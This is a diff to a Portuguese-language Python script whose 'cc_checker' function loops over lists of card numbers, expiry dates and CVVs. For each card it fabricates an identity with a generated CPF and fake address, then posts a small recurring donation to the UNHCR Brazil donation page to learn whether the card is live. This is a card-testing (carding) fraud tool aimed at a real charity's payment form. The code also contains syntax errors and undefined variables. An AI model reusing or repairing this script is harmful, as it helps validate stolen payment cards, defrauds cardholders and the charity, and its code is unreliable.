@@ -638,98 +638,103 @@ def cc_checker(token):
     try:
         lista=open(input(f'{C}Caminho da lista: '), 'r').read().splitlines()
     except:
+        lista = 0
         print(f'{C}[{R}i{C}] Erro,verifique se é um arquivo.')
         time.sleep(3)
+        
+    if lista = 0:
         pass
-    for gg in lista:
-        cc=gg.split('|')[0]
-        mes=gg.split('|')[1]
-        ano=gg.split('|')[2]
-        cvv=gg.split('|')[3]
-
-    data = requests.get('https://lookup.binlist.net/{}'.format(cc[0:6])).json()
-    pessoa = requests.get('https://randomuser.me/api/?nat={}'.format(data['country']['alpha2'])).json()
-    cpf = requests.get('http://geradorapp.com/api/v1/cpf/generate?token={}'.format(token[0])).json()
-
-    email_provider = ["@gmail.com","@outlook.com","@yahoo.com","@terra.com"]
-
-    email = (pessoa['results'][0]['first']) + "." + (pessoa['results'][0]['last']) + random.choice(email_provide)
-
-    print()
-    print(f'{C}[{G}i{C}] Consultando cartão')
-    print('Cartao: {}'.format(gg))
-    print('Bandeira: {}'.format(data['scheme']))
-    print('Tipo: {}'.format(data['type']))
-    print('Pais: {}'.format(data['country']))
-    print('Banco: {}'.format(data['bank']))
-    print('Nivel: {}'.format(data['brand']))
-    print()
-    print(f'{C}[{G}i{C}] Gerando pessoa aleatoria')
-    print('Nome: {} {}'.format(pessoa['results'][0]['first'],pessoa['results'][0]['last']))
-    print('Genero: {}'.format(pessoa['results'][0]['gender']))
-    print('Nascimento: {}'.format(pessoa['results'][0]['dob']['date'][0:10]))
-    print('CPF: {}'.format(cpf['number_formatted']))
-    print('CPF sem formatação: {}'.format(cpf['number']))
-    print('E-mail: {}'.format(email))
-    print('CEP: {}{}'.format(pessoa['results'][0]['location']['postcode'],'-000'))
-    print('Endereço: {}'.format(pessoa['results'][0]['location']['street']['name']))
-    print('Cidade: {}'.format(pessoa['results'][0]['location']['city']))
-    print('Estado: {}'.format(pessoa['results'][0]['location']['state']))
-    print()
-
-    header = {
-        'Host': 'doar.acnur.org',
-        'Connection': 'keep-alive',
-        'Content-Length': '1036',
-        'Cache-Control': 'max-age\u003d0',
-        'Origin': 'https://doar.acnur.org',
-        'Upgrade-Insecure-Requests': '1',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.09.4.5083',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-User': '?1',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3',
-        'Sec-Fetch-Site': 'same-origin',
-        'Referer': 'https://doar.acnur.org/acnur/donate.html',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Accept-Language': 'pt-BR,pt;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7',
-        'Cookie': 'ROUTEID\u003d.zolaBETA; _gcl_au\u003d1.1.751806228.1604113311; _ga\u003dGA1.3.972845617.1604113311; _gid\u003dGA1.3.1315302043.1604113311; _ga\u003dGA1.2.972845617.1604113311; _gid\u003dGA1.2.1315302043.1604113311; _uetsid\u003d6df17a801b2511eb91b7e9b62ecdda16; _uetvid\u003d6df60f501b2511ebb9704745327a0630; m_ses\u003d20201031000154; m_cnt\u003d0; _tq_id.TV-72092763-1.c79b\u003d24d79b933ff67001.1604113315.0.1604113315..; _fbp\u003dfb.1.1604113316536.1144821724; __qca\u003dP0-1736157422-1604113317181'
-        }
-
-    if pessoa['results'][0]['gender'] == 'female':
-        gender = 'F'
-    if pessoa['results'][0]['gender'] == 'male':
-        gender = 'M'
-    if data['type'] == 'credit':
-        tipo = 'C'
-    if data['type'] == 'debit':
-        tipo = 'D'
-    nome = pessoa['results'][0]['first'] + pessoa['results'][0]['last']
-
-    donate='successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY='+pais.get('currency')+'&EXPDATE='+mes+ano[1:3]+'&TAXID='+cpf['number']+'&AMT=35&TYPE='+tipo2+'%2F'+band+'&PAYPERIOD=MONT&X=&FIRSTNAME='+pessoa['results'][0]['name']['first']+'&LASTNAME='+pessoa['results'][0]['name']['last']+'&EMAIL='+email.replace('@','%40')+'&GENDER='+gender+'&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1='+pessoa['results'][0]['dob']['date'][0:10].replace('/','%2F')+'&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1='+pessoa['results'][0]['dob']['date'][0:10].replace('/','%2F')+'&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET='+pessoa['results'][0]['location']['street']['name'].replace(' ','+')+'&STREET2='+Centro+'&CITY='+pessoa['results'][0]['location']['city'].replace(' ','+')+'&STATE='+pessoa(['results'][0]['location']['state'])+'&ZIP='+str(pessoa['results'][0]['location']['postcode'])+'-000'+'&COUNTRY='+data['country']+'&PHONENUM=%2811%29+98765-4321&CCTYPE='+tipo+'%2F'+data['scheme']+'&ACCT='+cc+'&NAME='+nome.replace(' ','+')+'&CVV2='+cvv
-    RS=requests.request('POST',donate,headers=h,data=data).url
-    if RS=='https://doar.acnur.org/acnur/agradecimento.html':
-        print(f'{C}[{G}i{C}] Pagamento autorizado!')
     else:
-        RS=RS.split('=')[3]
-        if RS=='REFUSED_PAYMENT':
-            print(f'{C}[{R}ERROR{C}] Transação recusada.')
-        elif RS=='DATA_INVALID':
-            print(f'{C}[{R}ERROR{C}] Cartão invalido.')
-        elif RS=='FAIL_UNKNOWN':
-            print(f'{C}[{R}ERROR{C}] Erro Desconhecido ({R}possivel uso de cartao de Debito{C}).')
-        elif RS=='ERROR_NETWORK':
-            print(f'{C}[{R}ERROR{C}] Erro de rede.')
-        elif RS=='DATA_CARD_NOT_ALLOWED':
-            print(f'{C}[{R}ERROR{C}] Pagamento nao autorizado.')
-        elif RS=='REFUSED_PROVIDER':
-            print(f'{C}[{R}ERROR{C}] Pagamento recusado pela {Y}{band}{C}.')
-        elif RS=='REFUSED_BANK':
-            print('[{}ERROR{}] Recusado pelo {}{}{}.'.format(R,C,Y,banco.get('name'),C))
-        elif RS=='DATA_MISSING':
-            print(f'{C}[{R}ERROR{C}] Algum dado faltando.')
-        else:
-            print(f'{C}[{R}ERROR{C}] Erro não listado.')
+        for gg in lista:
+            cc=gg.split('|')[0]
+            mes=gg.split('|')[1]
+            ano=gg.split('|')[2]
+            cvv=gg.split('|')[3]
+
+            data = requests.get('https://lookup.binlist.net/{}'.format(cc[0:6])).json()
+            pessoa = requests.get('https://randomuser.me/api/?nat={}'.format(data['country']['alpha2'])).json()
+            cpf = requests.get('http://geradorapp.com/api/v1/cpf/generate?token={}'.format(token[0])).json()
+
+            email_provider = ["@gmail.com","@outlook.com","@yahoo.com","@terra.com"]
+
+            email = (pessoa['results'][0]['first']) + "." + (pessoa['results'][0]['last']) + random.choice(email_provide)
+
+            print()
+            print(f'{C}[{G}i{C}] Consultando cartão')
+            print('Cartao: {}'.format(gg))
+            print('Bandeira: {}'.format(data['scheme']))
+            print('Tipo: {}'.format(data['type']))
+            print('Pais: {}'.format(data['country']))
+            print('Banco: {}'.format(data['bank']))
+            print('Nivel: {}'.format(data['brand']))
+            print()
+            print(f'{C}[{G}i{C}] Gerando pessoa aleatoria')
+            print('Nome: {} {}'.format(pessoa['results'][0]['first'],pessoa['results'][0]['last']))
+            print('Genero: {}'.format(pessoa['results'][0]['gender']))
+            print('Nascimento: {}'.format(pessoa['results'][0]['dob']['date'][0:10]))
+            print('CPF: {}'.format(cpf['number_formatted']))
+            print('CPF sem formatação: {}'.format(cpf['number']))
+            print('E-mail: {}'.format(email))
+            print('CEP: {}{}'.format(pessoa['results'][0]['location']['postcode'],'-000'))
+            print('Endereço: {}'.format(pessoa['results'][0]['location']['street']['name']))
+            print('Cidade: {}'.format(pessoa['results'][0]['location']['city']))
+            print('Estado: {}'.format(pessoa['results'][0]['location']['state']))
+            print()
+
+            header = {
+                'Host': 'doar.acnur.org',
+                'Connection': 'keep-alive',
+                'Content-Length': '1036',
+                'Cache-Control': 'max-age\u003d0',
+                'Origin': 'https://doar.acnur.org',
+                'Upgrade-Insecure-Requests': '1',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.09.4.5083',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-User': '?1',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3',
+                'Sec-Fetch-Site': 'same-origin',
+                'Referer': 'https://doar.acnur.org/acnur/donate.html',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'pt-BR,pt;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7',
+                'Cookie': 'ROUTEID\u003d.zolaBETA; _gcl_au\u003d1.1.751806228.1604113311; _ga\u003dGA1.3.972845617.1604113311; _gid\u003dGA1.3.1315302043.1604113311; _ga\u003dGA1.2.972845617.1604113311; _gid\u003dGA1.2.1315302043.1604113311; _uetsid\u003d6df17a801b2511eb91b7e9b62ecdda16; _uetvid\u003d6df60f501b2511ebb9704745327a0630; m_ses\u003d20201031000154; m_cnt\u003d0; _tq_id.TV-72092763-1.c79b\u003d24d79b933ff67001.1604113315.0.1604113315..; _fbp\u003dfb.1.1604113316536.1144821724; __qca\u003dP0-1736157422-1604113317181'
+                }
+
+            if pessoa['results'][0]['gender'] == 'female':
+                gender = 'F'
+            if pessoa['results'][0]['gender'] == 'male':
+                gender = 'M'
+            if data['type'] == 'credit':
+                tipo = 'C'
+            if data['type'] == 'debit':
+                tipo = 'D'
+            nome = pessoa['results'][0]['first'] + pessoa['results'][0]['last']
+
+            donate='successUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Fagradecimento.html%3Fd%3DBRPT00GD00%2520General%26r%3Dtrue%26a%3D%24%7BconvertedAmount%7D%26t%3D%24%7Btransaction.referenceID%7D%26u%3D%24%7Btransaction.nativeResponse%7D%26m%3DcreditCard%26v%3Ddonate&errorUrl=https%3A%2F%2Fdoar.acnur.org%2Facnur%2Ferror.html&pfpsrc=&DESCRIPTION=Com+Os+Refugiados&ONLINE_FORM=BRPT00GD00+General&LANGUAGE=pt&CURRENCY='+pais.get('currency')+'&EXPDATE='+mes+ano[1:3]+'&TAXID='+cpf['number']+'&AMT=35&TYPE='+tipo2+'%2F'+band+'&PAYPERIOD=MONT&X=&FIRSTNAME='+pessoa['results'][0]['name']['first']+'&LASTNAME='+pessoa['results'][0]['name']['last']+'&EMAIL='+email.replace('@','%40')+'&GENDER='+gender+'&CUSTOM_KEY_1=birthdate&CUSTOM_KEY_2=device&CUSTOM_VALUE_1='+pessoa['results'][0]['dob']['date'][0:10].replace('/','%2F')+'&CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_KEY_1=birthdate&GIFT_CUSTOM_KEY_2=device&GIFT_CUSTOM_KEY_3=entrypoint&GIFT_CUSTOM_VALUE_1='+pessoa['results'][0]['dob']['date'][0:10].replace('/','%2F')+'&GIFT_CUSTOM_VALUE_2=Mobile&GIFT_CUSTOM_VALUE_3=%2Facnur%2Fdonate.html&STREET='+pessoa['results'][0]['location']['street']['name'].replace(' ','+')+'&STREET2='+Centro+'&CITY='+pessoa['results'][0]['location']['city'].replace(' ','+')+'&STATE='+pessoa(['results'][0]['location']['state'])+'&ZIP='+str(pessoa['results'][0]['location']['postcode'])+'-000'+'&COUNTRY='+data['country']+'&PHONENUM=%2811%29+98765-4321&CCTYPE='+tipo+'%2F'+data['scheme']+'&ACCT='+cc+'&NAME='+nome.replace(' ','+')+'&CVV2='+cvv
+            RS=requests.request('POST',donate,headers=h,data=data).url
+            if RS=='https://doar.acnur.org/acnur/agradecimento.html':
+                print(f'{C}[{G}i{C}] Pagamento autorizado!')
+            else:
+                RS=RS.split('=')[3]
+                if RS=='REFUSED_PAYMENT':
+                    print(f'{C}[{R}ERROR{C}] Transação recusada.')
+                elif RS=='DATA_INVALID':
+                    print(f'{C}[{R}ERROR{C}] Cartão invalido.')
+                elif RS=='FAIL_UNKNOWN':
+                    print(f'{C}[{R}ERROR{C}] Erro Desconhecido ({R}possivel uso de cartao de Debito{C}).')
+                elif RS=='ERROR_NETWORK':
+                    print(f'{C}[{R}ERROR{C}] Erro de rede.')
+                elif RS=='DATA_CARD_NOT_ALLOWED':
+                    print(f'{C}[{R}ERROR{C}] Pagamento nao autorizado.')
+                elif RS=='REFUSED_PROVIDER':
+                    print(f'{C}[{R}ERROR{C}] Pagamento recusado pela {Y}{band}{C}.')
+                elif RS=='REFUSED_BANK':
+                    print('[{}ERROR{}] Recusado pelo {}{}{}.'.format(R,C,Y,banco.get('name'),C))
+                elif RS=='DATA_MISSING':
+                    print(f'{C}[{R}ERROR{C}] Algum dado faltando.')
+                else:
+                    print(f'{C}[{R}ERROR{C}] Erro não listado.')
+                pausa = ('Pressione enter para retornar.')
 
 def gerarlinkwhats():
     clear()
